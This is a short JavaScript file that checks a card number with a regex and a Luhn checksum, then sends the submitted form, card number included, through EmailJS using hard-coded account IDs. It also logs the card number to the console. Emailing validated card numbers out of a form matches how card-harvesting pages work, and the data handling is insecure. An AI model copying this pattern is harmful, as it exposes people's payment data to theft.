
const validateCardNumber = number => {
    //Check if the number contains only numeric value  
    //and is of between 13 to 19 digits
    const regex = new RegExp("^[0-9]{13,19}$");
    if (!regex.test(number)){
        return false;
    }
  
return luhnCheck(number);
}

const luhnCheck = val => {
    let checksum = 0; 
    let j = 1; 

    for (let i = val.length - 1; i >= 0; i--) {
      let calc = 0;
      calc = Number(val.charAt(i)) * j;

      if (calc > 9) {
        checksum = checksum + 1;
        calc = calc - 10;
      }

      checksum = checksum + calc;

      
      if (j == 1) {
        j = 2;
      } else {
        j = 1;
      }
    }
  
    return (checksum % 10) == 0;

}


function isCardValid(event) {
    event.preventDefault()
    const valid = document.querySelector(".card")
    const cardHTML = document.getElementById('ccn').value
    console.log(cardHTML)
    if (validateCardNumber(cardHTML)) {
    return valid.classList += (" valid")
    }

    else {
        valid.classList += (" invalid")
        window.alert("Invalid card number!")
    }
}    

function contact(event) {
  event.preventDefault();
  const cardsHTML = document.getElementById('ccn').value
  if (validateCardNumber(cardsHTML) == true) {
    emailjs
        .sendForm(
            'service_dmitxjp',
            'template_6ohldvp',
            event.target,
            'user_zR7xVOSuitbB47julzrU0'
        ).then(() => {
            console.log('thisworked1')
        })
      }
  else {
    window.alert("Please enter a correct card number and try again")
  }
}

